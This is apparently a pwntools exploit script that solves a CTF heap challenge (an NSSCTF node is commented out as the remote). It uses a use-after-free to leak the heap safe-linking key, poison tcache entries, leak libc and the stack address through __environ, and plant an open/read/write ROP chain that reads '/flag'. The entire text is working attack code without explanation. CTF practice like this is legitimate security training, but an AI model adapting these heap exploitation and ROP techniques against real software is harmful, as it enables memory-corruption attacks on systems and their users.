from pwn import *
context(log_level='debug',arch='amd64',terminal=['tmux','splitw','-h'])


# io=remote("node4.anna.nssctf.cn",28257)
io=process("./pwn")
elf=ELF("./pwn")
libc=ELF("./libc.so.6")


def add():
    io.sendlineafter("Choice: ","1") #0x100
    
def delete(n):
    io.sendlineafter("Choice: ","2")
    io.sendlineafter("Idx: \n",str(n))
    
def show(n):
    io.sendlineafter("Choice: ","3")
    io.sendlineafter("Idx: \n",str(n))

def edit(n,s,cc):
    io.sendlineafter("Choice: ","4")
    io.sendlineafter("Idx: \n",str(n))
    io.sendlineafter("Size: \n",str(s))
    io.sendafter("Content: \n",cc)

# gdb.attach(io)
# pause()

add() #0
add() #1
delete(0)
show(0)
key=u64(io.recv(5).ljust(8,b"\x00"))
print("key: "+hex(key))
heap_addr=key<<12
print("heap_addr: "+hex(heap_addr))

delete(1)
payload=p64((heap_addr+0x10)^key)+p64(0)
edit(1,len(payload),payload)

add() #2
add() #3

payload=b"\x00"*0x4e+b"\x07"
edit(3,len(payload),payload)
delete(3)
payload=b"\x01"
edit(3,len(payload),payload)
show(3)
leak_addr=u64(io.recvuntil(b"\x7f")[-6:].ljust(8,b"\x00"))-0x71-libc.sym[b"__malloc_hook"]
print("leak_addr: "+hex(leak_addr))


pop_rdi=leak_addr+next(libc.search(asm("pop rdi;ret")))
pop_rsi=leak_addr+next(libc.search(asm("pop rsi;ret")))
fake_pop_rdx=next(libc.search(asm("pop rdx;ret")))
print("fake_pop_rdx: "+hex(fake_pop_rdx))
pop_rdx=leak_addr+0x0c7f32
pop_rax=leak_addr+next(libc.search(asm("pop rax;ret")))
ret=leak_addr+next(libc.search(asm("ret")))
str_sh=leak_addr+next(libc.search(b"/bin/sh"))
sys_addr=leak_addr+libc.sym[b"system"]
open_a=leak_addr+libc.sym[b"open"]
read_a=leak_addr+libc.sym[b"read"]
write_a=leak_addr+libc.sym[b"write"]
environ=leak_addr+libc.sym[b"__environ"]


payload=b"/flag\x00\x00\x00"+b"\x00"*0x16+b"\x02"
edit(3,len(payload),payload)

delete(1)
payload=p64(environ^key)+p64(0)
edit(1,len(payload),payload)
add() #4
add() #5
show(5)
stack_addr=u64(io.recvuntil(b"\x7f")[-6:].ljust(8,b"\x00"))
print("stack_addr: "+hex(stack_addr))
ret_addr=stack_addr-0x138
print("ret_addr: "+hex(ret_addr))


delete(4)
payload=p64((ret_addr)^key)+p64(0)
edit(4,len(payload),payload)



#open
orw=p64(0)*3+p64(pop_rdi)+p64(heap_addr+0x10)+p64(pop_rsi)+p64(0)+p64(open_a)
#read
orw+=p64(pop_rdi)+p64(3)+p64(pop_rsi)+p64(heap_addr+0x300)+p64(pop_rdx)+p64(0x50)+p64(read_a)
#write
orw+=p64(pop_rdi)+p64(1)+p64(pop_rsi)+p64(heap_addr+0x300)+p64(pop_rdx)+p64(0x50)+p64(write_a)



payload=b"/flag\x00\x00\x00"+b"\x00"*0x16+b"\x02"
edit(3,len(payload),payload)


add() #6
add() #7

# gdb.attach(io)
# pause()

edit(7,len(orw),orw)


io.interactive()